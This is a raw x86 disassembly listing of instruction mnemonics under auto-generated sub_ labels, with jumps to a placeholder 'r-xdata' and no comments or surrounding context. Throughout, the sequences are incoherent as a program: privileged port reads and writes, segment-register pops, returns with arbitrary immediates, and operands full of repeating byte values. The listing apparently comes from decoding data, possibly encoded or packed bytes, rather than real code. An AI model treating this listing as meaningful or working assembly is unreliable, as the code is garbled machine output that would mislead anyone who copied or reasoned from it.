adc al 0x52
push edx
push edx
or edx edi
xchg edx eax
pop ebp
salc
push esi
push edx
push edx
push edx
fld [ esi ]
jbe r-xdata
retn 0x34c2
push edx
add eax 0x563aaad9
push ebx
push edx
push edx
fstp st7
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add ah [ ecx - 0x5c ]
mov ebx 0x525245cb
retn 0xc2c2
add esi [ edi + 0x52 ]
imul ebp [ esi ] 0x76
dec esi
pop ebp
xlat
push edi
push edx
push edx
push edx
xchg esp eax
push ss
jbe r-xdata
push edx
xchg ebp eax
pop ss
sub_462e25
xchg ebp eax
pop ss
mov [ 0x1795521f ] al
mov bl [ edi ]
cmp esi [ ecx ]
and [ ebp + 0x213d8e17 ] dl
cmp eax 0xb2179534
jb r-xdata
ja r-xdata
and al 0x95
pop ss
0x43c370a 0xb8bb
retn 0x34c2
push edx
add eax 0x563aaad9
push ebx
push edx
push edx
fstp st7
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add ah [ ecx - 0x5c ]
mov ebx 0x525245cb
retn 0xc2c2
sub_462ec7
xlat
mov ch [ edi - 0x14445253 ]
mov esi 0xc2c2adad
cmp [ esp + esi - 0x25 ] ah
das
mov edx 0xadb533bb
lodsd [ esi ]
fist [ edi ]
inc edx
add bh [ edx ]
push esp
push edx
push eax
push edx
add edi ebx
xlat
mov esi 0x2adadaf
cmp dl [ ebx + 0x52 ]
push edx
rcr bl cl
cmovb ebp [ ebp + 0x5252aac5 ]
push edx
xlat
xchg edx eax
pop ebp
xlat
xchg esi eax
sub [ ebp - 0x7b0b4453 ] 0xc2c2adad
retn 0xc2c2
sub_462f1b
pop ss
pop edx
add edi [ edx - 0x525276bd ]
pop ebp
in eax 0x14
push esp
mov ebx 0x52524047
lodsd [ esi ]
add eax 0x7246bb72
push edx
push edx
xor al 0xdb
movzx edi [ ebx - 0x52525712 ]
pop ebp
in eax 0x43
mov ebx 0x52525708
retn 0x9261
sub_462fb4
shr [ eax - 0x4828a287 ] 0x1
push esi
push edx
push edx
mov ebx 0xadadad29
lodsd [ esi ]
and al 0x2
lodsd [ esi ]
and al 0x66
lodsd [ esi ]
daa
mov dh 0xbb
push cs
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xbac2
sub_462fe4
fstp st7
0x2adadaf 0x4ad
jle r-xdata
push edx
push edx
retn 0xc2c2
cmovb ebx [ ebp - 0x29 ]
js r-xdata
xor al 0xdb
pop ss
mov [ edx ] cs
mov ebx 0xadadb1b5
retn 0xc2c2
push edx
push edx
fstp st7
0x2adadaf 0xd7df
out 0xaa al
lodsd [ esi ]
lodsd [ esi ]
add bl cl
xchg esp eax
mov edx 0xadadb59b
or ecx [ ebx ]
mov ebx 0xadad8a75
retn 0xc2c2
sub_4630c5
in eax 0x14
push esp
lodsd [ esi ]
pop ss
cmpsb [ esi ] [ edi ]
rcl [ edi ] 0x1
stosb [ edi ]
jpe r-xdata
fild [ edi ]
mov al 0x61
cmp [ eax ] 0x3c
mov ebx 0xadada748
retn 0xc2c2
pop ss
cmpsb [ esi ] [ edi ]
mov ebx 0xadad896a
retn 0xc2c2
sub_463121
pop ebp
in eax 0x43
add ecx edx
xchg ebx eax
push eax
add eax 0xa8d1a8d9
jg r-xdata
lodsd [ esi ]
vrsqrtss xmm2 xmm6 [ edx + 0x52 ]
imul ecx [ edi ] 0x5e
mov ebx 0x52525d5f
retn 0xbbc2
salc
fld [ ebp + ebp * 4 - 0x53d64453 ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xdb34
sub_463176
pop ss
mov dl 0x2
lodsd [ esi ]
and al 0x6
lodsd [ esi ]
daa
pop edx
lodsd [ esi ]
daa
scasb [ edi ]
lodsd [ esi ]
daa
mov dh 0xad
add eax 0x27ad014e
mov edx 0x52cac5ad
push edx
push edx
imul ecx [ edi ] 0x5e
mov ebx 0x52525d5f
retn 0xbbc2
sub_463276
xchg esp eax
mov edx 0xadad832e
or edx edi
xchg edx eax
pop ebp
salc
inc ebp
ja r-xdata
push edx
mov ebx 0x52524d02
retn 0x5dc2
push edx
popad
lodsd [ esi ]
add [ ebx + 0x5252775a ] edi
pop ebp
xlat
push esi
mov cl 0xad
lodsd [ esi ]
fild [ edi ]
0xafe2dfdf 0xadad
sub_463421
add eax 0x7626ad00
dec edx
mov edx 0x52525153
rcl [ esi - 0x2dadc5a2 ] 0x1
push edx
push edx
add [ ebp - 0x52b589da ] ebp
add al 0x26
adc eax 0x4a761ead
pop ebp
xlat
ror [ eax - 0x45fb5253 ] cl
jae r-xdata
pop es
enter 0x32bb 0xba
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
push edx
push edx
or edx edi
xchg edx eax
pop ebp
salc
inc esp
push edx
push edx
push edx
add [ ebp + 0x5252fec4 ] ebp
push edx
cmp ch [ ebp + 0x1525252 ]
add al 0xba
xchg esi eax
push eax
push edx
push edx
rcl [ esi - 0x487f44a2 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4634a0
xchg ebx eax
push eax
popad
xchg edx eax
fisttp [ eax ]
cmp [ ebx + 0x52525665 ] 0xc2
push ecx
pop ss
inc edx
fist [ edi ]
stosb [ edi ]
fst [ edi ]
scasb [ edi ]
mov ebx 0xadadac41
retn 0xad61
sub_4634e2
fucomi st4
xchg esi eax
push edx
push edx
push edx
fcmovne st4
rcl [ edx + 0x52 ] cl
push edx
mov edx 0x52525c72
cmp cl [ eax ]
mov ebp 0xdb05bf0d
adc al 0x2
mov edx 0x52525c40
cmp bl [ edi ]
inc eax
dec ebp
add [ 0xffffffffba0614db ] al
push esi
pop esp
push edx
push edx
cmp cl [ esi - 0x80 ]
out dx al
fstp [ ebx - 0x525262a2 ]
retn 0x38c2
sub_4635b7
shl dh cl
push edx
push edx
push edx
rcl [ edx - 0x553c44a6 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
in eax 0x8e
push edx
push edx
push edx
add [ edx + edi * 4 ] eax
push cs
push ebx
push edx
push edx
lodsd [ esi ]
daa
pop esi
lodsd [ esi ]
daa
pop edx
mov edx 0x52525f65
rcl [ esi + 0x6954db46 ] 0x1
xchg ecx eax
mov ebx 0x52524d9b
retn 0x95c2
sub_4635eb
push edx
push ebp
push edx
push ebx
push edx
lodsd [ esi ]
daa
mov dl 0xdb
pop ss
xchg [ ebp - 0x6d28f9fb ] ch
pop ebp
salc
aam 0x9c
lodsd [ esi ]
lodsd [ esi ]
mov edx 0x52524fd3
fist [ edi ]
sahf
imul edx [ esi ] 0x524b16bb
push edx
retn 0xc2c2
sub_46364e
rcl [ edx + 0x52 ] cl
push edx
fldcw [ edx - 0x28a25229 ]
push ebp
push edx
push edx
push edx
add ch [ ebp + 0x5252fec4 ]
push edx
mov edx 0x52525a12
shr [ edx + 0x20d65d53 ] 0x1
mov ch [ ebp - 0x246d9e53 ]
push ss
jbe r-xdata
mov edx 0x52525a3c
or eax 0x92d7090c
fist [ esi ]
jbe r-xdata
pop ebp
salc
in eax 0x48
push edx
push edx
fistp [ edi ]
xchg bh bl
pop ss
idiv [ edx + 0x52525a0a ]
xlat
xchg edx eax
pop ebp
salc
test [ eax + 0x52 ] 0x52
fistp [ edi ]
xchg esi eax
fist [ edi ]
idiv [ edx + 0x52525a17 ]
xlat
xchg edx eax
pop ebp
salc
retn
xlat
imul edx [ ecx ] 0x4a
pop ebp
aam 0x5f
popfd
lodsd [ esi ]
lodsd [ esi ]
shl [ esi ] 0x1
jbe r-xdata
xchg edx eax
push edx
mov ebx 0xadadb6a3
retn 0xc2c2
sub_4636f4
dec eax
push edx
push edx
fistp [ edi ]
out 0xdf al
pop ss
idiv [ ebx - 0x525243b4 ]
bound eax [ edx + 0x12 ]
sbb al 0xbb
mov ah 0x4f
push edx
push edx
retn 0xd1c2
sub_46370e
das
scasb [ edi ]
push esi
pop ebp
fidivr [ 0xffffffffd952525d ]
sbb dl [ esi + 0x5d ]
in eax 0x5b
shr [ ebx - 0x5a28a29d ] 0x1
push ecx
push edx
push edx
mov ebx 0xadad9cb5
retn 0xbbc2
sub_46379f
mov edi [ ebx + 0x525243d2 ]
xor al 0xdb
pop ss
mov dh 0xa
cmp [ edi ] dh
xor al 0xdb
pop ss
mov ah 0xa
cmp [ ecx + ebx * 8 ] bh
0xad9c68bb 0xc2ad
fwait
xchg ecx eax
retn 0xc2c2
sub_463988
dec edx
pop ecx
push edx
push edx
shr [ esi ] 0x1
jbe r-xdata
retn 0xc2c2
push ebx
pop ebp
xlat
and [ edx + 0x2ed1adad ] al
jbe r-xdata
popad
lodsd [ esi ]
adc eax 0xd75d92d7
pop edi
push edx
push edx
push edx
mov edx 0xadad8554
xlat
xchg edx eax
pop ebp
salc
mov es [ eax - 0x7e445253 ]
sub [ ebp - 0x3d3d3d53 ] 0xc2
retn 0xc2c2
push ebx
pop ebp
xlat
lds ebp [ esi + 0x15dfadad ]
push ebx
add bl [ ebp - 0x1c ]
push ebp
add dl bl
xchg ebp eax
cwde
push edx
push edx
push edx
fstp st6
jbe r-xdata
pop ebp
in al 0x55
push eax
push edx
push edx
add eax 0xba94d902
dec ebp
popfd
lodsd [ esi ]
lodsd [ esi ]
rcl [ esi + 0x58b5bb42 ] 0x1
push edx
push edx
retn 0xc2c2
sub_463a05
fldenv [ edx ]
outsb
push ecx
mov [ 0x17026cd3 ] al
push edx
push edx
pop ebp
xlat
and [ eax + 0x52 ] bl
push edx
pop ebp
in eax 0x14
inc esi
mov ebx 0xadad9df4
pop es
fnstcw [ esi - 0x52506445 ]
lodsd [ esi ]
retn 0xc2c2
sub_463a40
bound edx [ edx + 0x52 ]
lodsd [ esi ]
and al 0x2
add [ ebp + 0x5252d2c5 ] ebp
push edx
mov ebx 0x525240aa
xlat
xchg edx eax
pop ebp
xlat
and eax 0xdfadadb2
pop ss
mov [ edx ] 0xbb
dec ecx
sub [ ebp - 0x3d3d3d53 ] 0xc2c2c2c2
retn 0xc2c2
sub_463a9e
pop ebp
salc
pop eax
push edx
push edx
push edx
popad
lodsd [ esi ]
add [ 0x52fec4ad ] edx
push edx
push edx
fist [ edi ]
jle r-xdata
mov edx 0xadad9b6d
or edi [ ebx - 0x52524b03 ]
retn 0x94d9
fst [ edx + edi * 4 - 0x52526493 ]
sub_463b5f
xlat
dec edx
push edx
push edx
push edx
fstp st7
0x2adadaf 0x4ad
rcr [ ss : edx - 0x2820fdb0 ] 0x1
0x2adadaf 0x4ad
cmp bl cl
pop ss
pop esi
imul edx [ ecx - 0x44bf29a3 ] 0xdfdfadad
0xbbadadaf 0xbb50
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463bab
and cl bl
xchg ebp eax
xor al 0xdb
pop ss
inc esi
or bh [ eax ]
cmp eax 0xbb313808
sbb [ ecx - 0x263d5253 ] eax
push ebx
fstp [ ebx ]
stosb [ edi ]
mov ebx 0xadad9f31
retn 0xc2c2
sub_463bcb
add [ ecx ] eax
cmp [ edx + 0x1 ] dh
add [ ecx ] eax
add edi ebx
xlat
[ edi ]
lodsd [ esi ]
lodsd [ esi ]
add ch [ ebp - 0x52fefdfb ]
vrsqrtss xmm2 xmm0 [ edx + 0x52 ]
cmp [ esi ] dh
lodsd [ esi ]
add eax 0x8332bb5a
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463c6e
fld [ edi ]
mov eax 0x83e380d
xor al 0xdb
pop es
jl r-xdata
or bh [ eax ]
and dh [ ebx + ebx * 8 ]
pop ss
mov [ edx ] cs
cmp [ esp + esi - 0x25 ] bh
pop ss
mov dl 0xa
cmp [ eax ] dh
xor al 0xdb
and [ esi - 0x3d3d5253 ] 0x17db34c2
test al 0xa
xor al 0xdb
pop ss
scasb [ edi ]
popad
xchg edx eax
xor al 0xdb
pop ss
lodsb [ esi ]
cmp dl [ esi + 0x53 ]
push edx
push edx
fstp st7
loop r-xdata
pop ss
mov al 0xa
cmp [ ebx ] dh
xor al 0xdb
pop ss
mov dh 0xa
cmp [ esi ] ah
mov ebx 0xadadacea
fst [ edi ]
scasb [ edi ]
adc bl bl
pop ss
scasb [ edi ]
mov ebx 0xadadaa1c
retn 0xc2c2
lodsd [ esi ]
lodsd [ esi ]
add bl cl
pop ss
pop edx
cmp [ edx - 0x45 ] dl
outsd
push esi
push edx
push edx
retn 0xc2c2
sub_463cd0
fisttp [ edi ]
mov [ 0x525c3eba ] al
push edx
rcl [ esi - 0x57f644a2 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
pop ebp
salc
jpo r-xdata
retn 0xc2c2
push edx
push edx
xlat
mov [ ebp - 0x2a ] ebx
jae r-xdata
retn 0xacd9
push edx
push edx
shl [ edi ] 0x1
scasb [ edi ]
push edx
mov ebx 0xadadb893
retn 0xbeba
sub_463cfa
sub [ ebp + 0x4296d1ad ] 0xffffffd1
r-xdata
scasb [ edi ]
push ebx
push edx
push edx
push edx
fst [ edi ]
scasb [ edi ]
or al 0x9
mov ebx 0xadada2c6
retn 0xc2c2
push edx
fist [ esi ]
jbe r-xdata
retn 0x1795
pop ebp
salc
sbb [ esi + 0x13bbadad ] bh
mov esi 0x34c2adad
shr [ ebx - 0x522344f2 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0x27ad
sub_463da4
xchg edx eax
pop ebp
salc
push esi
push edx
push edx
push edx
add ch [ ebp + 0x29d15a04 ]
adc dl [ edx + 0x5d ]
salc
jpe r-xdata
mov edx 0x52525757
rcl [ esi - 0x447526be ] 0x1
cwde
xchg esi eax
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
push edx
push edx
cmp [ edx + 0x3a ] dl
mov [ 0xffffffffad123b4f ] eax
in al 0x96
push edx
push edx
push edx
fldcw [ edx + edi * 4 - 0x5252650a ]
rcl [ esi - 0x47cd90a2 ] 0x1
push edx
push edx
pop ebp
aad 0x54
push edx
push edx
push edx
lodsd [ esi ]
and [ edx ] edx
lodsd [ esi ]
add al 0x5a
popad
lodsd [ esi ]
adc eax 0xbb7a296b
mov al 0xb8
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463df8
lodsd [ ss : esi ]
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadad8460
cmp bh [ ecx ]
pop eax
adc [ eax ] dl
add al 0xd9
stosb [ edi ]
mov edx 0x52525757
rcl [ esi - 0x447526be ] 0x1
cwde
xchg esi eax
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463fc2
push eax
mov ebx 0xadadb664
fist [ edi ]
mov es [ edx ]
fist [ edi ]
rol [ edx ] cl
add [ ecx ] eax
cmp [ esi - 0x45 ] dl
bound ebx [ esi - 0x453d5253 ]
xor [ eax + 0x610badad ] edx
xchg edx eax
mov ebx 0xadada3b9
retn 0xc2c2
sub_463ffa
lodsd [ esi ]
lodsd [ esi ]
cmp [ edx - 0x21 ] al
pop ss
mov [ 0x77ba0201 ] al
movsd [ edi ] [ esi ]
lodsd [ esi ]
lodsd [ esi ]
rcl [ esi - 0x5de820b6 ] 0x1
add bl bh
pop ss
cli
mov ebx 0xadad9991
retn 0xc2c2
sub_464036
add al 0x5a
fstp st7
out dx al
test al 0xad
lodsd [ esi ]
add ch [ ebp + 0x4fbb7e04 ]
sub [ ebp - 0x3d3d3d53 ] 0xc2
fist [ edi ]
cmpsb [ esi ] [ edi ]
popad
lodsd [ esi ]
fldenv [ esi ]
out dx eax
mov dh 0xbb
int1
mov al 0xad
lodsd [ esi ]
retn 0xbed9
sub_464067
add al 0xba
mulps xmm2 [ edx + 0x52 ]
popad
movsb [ edi ] [ esi ]
xlat
xchg edx eax
pop ebp
salc
sbb [ edi + 0x10bbadad ] edx
popfd
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4640a7
pop ebp
salc
popad
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
daa
mov esi 0x71bb95d9
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464163
lodsd [ esi ]
jbe r-xdata
xor al 0xd9
and [ ecx - 0x6e ] 0x34
fist [ edi ]
and bh [ ebx - 0x52527b51 ]
retn 0xc2c2
mov edx 0xadada793
rcl [ esi - 0x2dadc5a2 ] 0x1
push edx
push edx
add [ ebp - 0x44b589da ] ebp
jb r-xdata
push ebx
push edx
push edx
retn 0xc2c2
lodsd [ esi ]
lodsd [ esi ]
retn 0x5dc2
sub_46419a
dec ebp
fldenv [ eax + 0x525cd1bb ]
push edx
or [ ebx + ebx * 8 ] dh
pop es
cmp [ ss : 0x17db3408 ] dh
cmp al 0x34
fild [ edi ]
xor al 0xd9
and [ ecx - 0x6e ] 0x34
fist [ edi ]
and bh [ ebx - 0x52527b51 ]
retn 0xc2c2
sub_464378
inc edi
push edx
push edx
push edx
shr [ esi ] 0x1
jbe r-xdata
sub eax 0xd45d5256
add [ esi + 0x36d1adad ] 0x76
jbe r-xdata
push ebx
pop ebp
salc
pop eax
push edx
push edx
push edx
shr [ 0xffffffffd75d5372 ] 0x1
shl [ ebx + 0x2dd1adad ] cl
dec esi
push ebx
pop ebp
xlat
jecxz r-xdata
add bh [ edx - 0x52525ead ]
cmp [ edx - 0x21 ] al
pop ss
loop r-xdata
fist [ esi ]
jbe r-xdata
inc edx
mov ebx 0x525252af
retn 0xc2c2
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0x525240d4
retn 0x2e6b
lodsd [ esi ]
lodsd [ esi ]
add al 0x3a
add bh [ edx - 0x52525f59 ]
fist [ edi ]
mov dh 0x1
add bh [ edx - 0x52525f7d ]
fst [ edi ]
pop edx
fldenv [ edx ]
outsb
push ecx
mov [ 0x4614e55d ] al
mov ebx 0xadadbc85
add al 0xec
jle r-xdata
lahf
cmpsb [ esi ] [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add bl [ ebp - 0x1b ]
push ebp
add dh [ ecx + ebx * 8 ]
adc eax 0x16513450
jbe r-xdata
retn 0xc2c2
push edx
push edx
popad
mov [ edi + ebx * 8 ] eax
xlat
sub [ edi + 0x25bbadad ] 0xb2
lodsd [ esi ]
lodsd [ esi ]
mov [ 0xffffffffad123b4f ] eax
in eax 0x96
push edx
push edx
push edx
mov edx 0xadad907a
add bl bh
pop ss
cmpsb [ esi ] [ edi ]
mov ebx 0xadada69f
cmpsd [ esi ] [ edi ]
mov al [ 0x3a04adad ]
pop ebp
in eax 0x92
add bl cl
xchg esp eax
mov edx 0xadad886f
rcl [ esi + 0x7616db5e ] 0x1
dec edx
xlat
xchg edx eax
pop ebp
salc
fld [ esi + 0x2ed1adad ]
jbe r-xdata
retn 0xc5ad
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadb225
push edx
pop ebp
salc
salc
xchg [ ebp - 0x79bb4453 ] ch
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464421
lodsd [ ss : esi ]
lodsd [ esi ]
lodsd [ esi ]
add al 0x2
mov edx 0xadada153
cmp [ edx - 0x21 ] al
pop ss
loop r-xdata
lodsd [ esi ]
lodsd [ esi ]
add al 0x3a
mov [ 0xffffffffad123b4f ] eax
in eax 0x96
push edx
push edx
push edx
mov edx 0xadad907a
add bl bh
pop ss
cmpsb [ esi ] [ edi ]
mov ebx 0xadada69f
fist [ edi ]
mov dh 0x1
add bh [ edx - 0x52525f7d ]
fst [ edi ]
pop edx
fldenv [ edx ]
outsb
push ecx
mov [ 0x4614e55d ] al
mov ebx 0xadadbc85
add al 0xec
jle r-xdata
add bh [ edx - 0x52525f59 ]
retn 0xc2c2
push edx
push edx
popad
mov [ edi + ebx * 8 ] eax
xlat
sub [ edi + 0x25bbadad ] 0xb2
lodsd [ esi ]
lodsd [ esi ]
retn 0xc5ad
sub_464523
salc
test eax 0xeaadad91
pop ds
or [ edx + 0x52 ] dl
xor al 0x6b
push ebx
pop ebp
xlat
mov edi 0xd9adad91
adc ebp [ esi + 0x51 ]
xchg ebx eax
pop ebp
salc
mov al 0x91
lodsd [ esi ]
lodsd [ esi ]
shr [ edx + 0x2 ] cl
pop ss
push edx
push edx
pop ebp
xlat
test [ ecx + 0x5abbadad ] dl
0xc2c2adad 0xd75d
movsd [ edi ] [ esi ]
sub [ ebp + 0x27ad02ad ] 0xb6
mov ebx 0xadad80b9
retn 0x910f
sub_4645e8
pop edx
push eax
push edx
push edx
fstp st7
sub ch [ edi + 0x201adad ]
mov edx 0xadada366
rcl [ esi - 0x53a52a2 ] 0x1
push edx
push edx
push edx
imul edx [ ecx - 0x5267e245 ] 0xad04c2ad
add eax 0x5d92d71e
salc
push esi
mov [ 0x48bbadad ] al
pop edx
push edx
push edx
retn 0x85ba
sub_46461e
out dx eax
lodsd [ esi ]
lodsd [ esi ]
or edx edi
xchg edx eax
pop ebp
xlat
and ch dh
lodsd [ esi ]
lodsd [ esi ]
fist [ edi ]
mov esi 0xba94d902
xchg ecx eax
out dx eax
lodsd [ esi ]
lodsd [ esi ]
or edx edi
xchg edx eax
pop ebp
xlat
push cs
out dx al
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadefd6
retn 0xc2c2
sub_464687
xchg edx eax
mov ebx 0xadad8bcc
xor al 0xdb
pop es
mov esp 0x83d93f38
xor al 0xdb
pop es
mov [ 0xffffffffdb348061 ] al
pop es
mov al [ 0x343e3808 ]
fild [ edi ]
0x2bbb82d9 0x5253
push edx
retn 0xc2c2
sub_4646e9
lodsd [ esi ]
add eax 0xa9d6dfdf
lodsd [ esi ]
lodsd [ esi ]
fstp st7
fisubr [ edi - 0x4e455253 ]
cdq
lodsd [ esi ]
lodsd [ esi ]
fild [ edi ]
mov edx 0xad9a28ba
lodsd [ esi ]
cmp [ edx + ecx ] ah
cmp [ edi ] bh
mov ebx 0x52525f62
retn 0xc2c2
sub_4647bb
shr [ edi ] 0x1
scasb [ edi ]
push ebx
pop ebp
xlat
arpl [ esi + 0x14d9adad ] dx
cmp ch [ esi + 0x58 ]
jno r-xdata
jb r-xdata
mov ebx 0xadadb6cc
retn 0x95c2
retn 0x79c2
xor [ edx - 0x6b ] dh
pop ss
cmpsb [ esi ] [ edi ]
jo r-xdata
retn 0x1679
and [ ebx - 0x52524c1f ] edi
retn 0xc2c2
sub_46481d
imul esp [ ecx - 0x80 ] 0xffffffbb
or eax 0xc2adadad
xor al 0xdb
pop es
cwde
or [ eax ] bh
and eax 0x9e07db34
or [ eax ] bh
and [ ebx + ebx * 8 ] dh
pop ss
or [ edx ] 0x34
fist [ edi ]
cmp [ eax ] 0x37
mov ebx 0x52525712
retn 0xadc2
sub_46486a
add edx ecx
aaa
scasb [ edi ]
push edx
xchg edx eax
push edx
push edx
push edx
fist [ edi ]
scasb [ edi ]
popad
xchg edx eax
mov ebx 0xadad9361
pop ebp
salc
jl r-xdata
push edx
push edx
mov ebx 0xadade943
retn 0x27ad
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadade9e9
fist [ edi ]
stosb [ edi ]
imul edx [ ebp - 0x5263a345 ] 0xc2c2c2ad
pop ebp
salc
aad 0x87
lodsd [ esi ]
lodsd [ esi ]
popad
xchg edx eax
adc bh [ ebx - 0x5252782d ]
retn 0xc2c2
sub_4648ab
push ss
jbe r-xdata
push edx
push edx
pop ebp
ficomp [ edx + 0x52 ]
push edx
push edx
cmp [ edx - 0x53 ] dl
mov ebx 0x52525856
add al [ edi + ebx * 8 ]
fstp st6
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0xadadb1b9
or ecx [ ebx ]
mov ebx 0xadadb0b0
retn 0xdb34
sub_4649aa
add ebx edi
push ds
jbe r-xdata
lahf
lodsd [ esi ]
lodsd [ esi ]
add eax [ edx ]
xor al 0xdb
push ss
jbe r-xdata
push edx
cmp [ edx - 0x53 ] dl
jbe r-xdata
lodsd [ esi ]
les esi [ esi + 0x3a525252 ]
push edx
rcl [ edx + 0x52 ] cl
mov ebx 0xadad9497
retn 0xd1c2
retn 0xc2c2
mov ebx 0xadad9fb5
sub_464c40
das
mov [ 0xffffffffdb3482d9 ] al
pop es
outsb
fldcw [ ebx - 0x24cb7c27 ]
das
mov al [ 0x6c07db34 ]
fldcw [ edx - 0x24cb7d27 ]
cmpxchg [ ebx + ebx * 8 ] dh
das
cmpsb [ esi ] [ edi ]
popad
lodsd [ esi ]
xor al 0xdb
pop es
adc bl cl
mov ah [ ecx - 0x80 ]
cmp [ 0xffffffffadb091bb ] ah
lodsd [ esi ]
retn 0xc2c2
sub_464c77
daa
inc esi
adc ebp [ ecx + 0x1f ]
pop esi
mov ebx 0xadadeb87
fstp st7
stosb [ edi ]
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov edx 0xadadeae3
mov ebx 0xadadb77f
retn 0xc2c2
sub_464d85
xor al 0xdb
pop ss
xchg [ ecx - 0x6e ] ah
xor al 0xdb
pop es
pushfd
xor al 0xdb
pop ss
test [ ebx + ebx * 8 ] dh
pop ds
cmpsb [ esi ] [ edi ]
cmp [ edi ] dh
or bh [ eax ]
mov ebx 0xadade761
rcl [ eax + 0x6ed13450 ] 0x1
inc ebx
push edx
mov ebx 0xadad8f3d
lodsd [ esi ]
daa
mov gs [ ebp - 0x44fa41d9 ]
cwde
fwait
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464dbd
fldcw [ edx - 0x55d024cc ]
cmp [ ecx + ebx * 8 ] al
lodsb [ esi ]
xor al 0xdb
das
test al 0x61
lodsd [ esi ]
xor al 0xdb
das
scasb [ edi ]
or eax 0xdb341038
das
loop r-xdata
mov ebx 0xadade51b
retn 0xbbc2
xor al 0xdb
das
loopne r-xdata
fwait
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
test al 0x38
sub dh [ ebx + ebx * 8 ]
das
out 0xd al
sub_464e37
or bh [ eax ]
ja r-xdata
jbe r-xdata
fist [ edi ]
mov dl 0xa
cmp [ ecx ] ah
xor al 0xdb
pop ss
mov al 0xa
cmp [ eax + 0x34 ] dh
fist [ edi ]
mov dh 0xa
mov ebx 0xadadafe1
retn 0xc2c2
retn 0xc2c2
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464e8e
fist [ edi ]
add [ edx ] 0xd9
pop ss
pop edx
mov edx 0xadade70c
mov ebx 0xadadad2a
lodsd [ esi ]
sbb ecx 0x5da4d7a2
salc
mov ch [ ecx - 0x11c55253 ]
mov ecx edi
out dx eax
mov ebx 0xadadb47e
retn 0xc2c2
sub_464ef9
in eax dx
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
push ss
jbe r-xdata
retn 0xc2c2
shr [ esi ] 0x1
jbe r-xdata
retn 0xdbc2
inc esi
mov ebx 0xadaded99
retn 0xc2c2
sub_464f0d
xor al 0xdb
das
mov al [ 0xffffffffdb34abd9 ]
das
cmpsb [ esi ] [ edi ]
fldcw [ esp + esi - 0x445bd025 ]
leave
lodsb [ esi ]
lodsd [ esi ]
lodsd [ esi ]
fstp st7
sub [ edi - 0x2e445253 ] 0xbb
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464f56
xlat
push ebp
push edx
push edx
push edx
add ch [ ebp + 0x5ad8e27 ]
push cs
lodsd [ esi ]
and al 0x2
mov ebx 0xadad93e7
add ch [ ebp - 0x44fafdfc ]
in eax dx
mov ah 0xad
lodsd [ esi ]
retn 0xc2c2
sub_465062
mov ah 0xad
lodsd [ esi ]
cmp [ edx - 0x21 ] al
pop ss
add [ edx + eax ] 0xba
out dx al
mov ah 0xad
lodsd [ esi ]
add al 0x3a
mov [ 0xffffffffad123b4f ] eax
in eax 0x96
push edx
push edx
push edx
mov edx 0xadade7bd
mov ebx 0xadadeb98
retn 0xba
sub_4651ed
cwde
lodsd [ esi ]
lodsd [ esi ]
rcl [ esi + 0x5d92d746 ] 0x1
salc
fsubrp st0
lodsd [ esi ]
lodsd [ esi ]
cmp dl [ edx + 0x42 ]
push edx
push edx
fist [ edi ]
0xbbad3802 0xacaa
lodsd [ esi ]
lodsd [ esi ]
fist [ esi + esi ]
mov edx 0xadada352
cmp bh [ ecx + 0x5c61b53 ]
fist [ edx + edi ]
mov ebx 0xadad9505
lodsd [ esi ]
cmp [ eax ] 0x56
mov ebx 0xadad869d
retn 0xd9c2
sub_46523a
mov ebx 0xadade211
pop ebp
xlat
push eax
push edx
push edx
push edx
movsd [ edi ] [ esi ]
mov dl [ ecx - 0x3d3d3d3e ]
cmp ch [ edx - 0x52e49262 ]
in eax 0x96
push edx
push edx
push edx
mov edx 0xadade647
mov ebx 0xadadab83
cmp [ esp + esi - 0x25 ] bh
pop ss
cmpsb [ esi ] [ edi ]
or dh [ ebx + ebx * 8 ]
pop ss
movsb [ edi ] [ esi ]
cmp [ edi ] dh
or dh [ ebx + ebx * 8 ]
pop ss
stosb [ edi ]
cmp [ edx ] ch
mov ebx 0xadad9a50
pop ebp
in eax 0x50
mov ebx 0xadad8f8c
retn 0xc2c2
sub_4652c4
fist [ edi ]
stosb [ edi ]
popad
xchg edx eax
xor al 0xdb
pop ss
test al 0x3a
push esi
push ebx
push edx
push edx
mov ebx 0xadad85bb
mov ebx 0xadade1d8
retn 0x42d8
sub_46531f
fstp [ edi ]
pop edx
fst [ edi ]
scasb [ edi ]
fld [ esi - 0x2c ]
push ecx
cmp [ edx + 0x52525150 ] 0x69
pop ss
pop esi
pop ebp
salc
sbb [ edx + 0x17adadad ] eax
scasb [ edi ]
fst [ edi ]
scasb [ edi ]
imul edx [ edi ] 0x8ad05daa
lodsd [ esi ]
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadade785
fnstcw [ esi + 0x14bb0303 ]
push ebx
push edx
push edx
or ecx [ ebx ]
fisttp [ edi ]
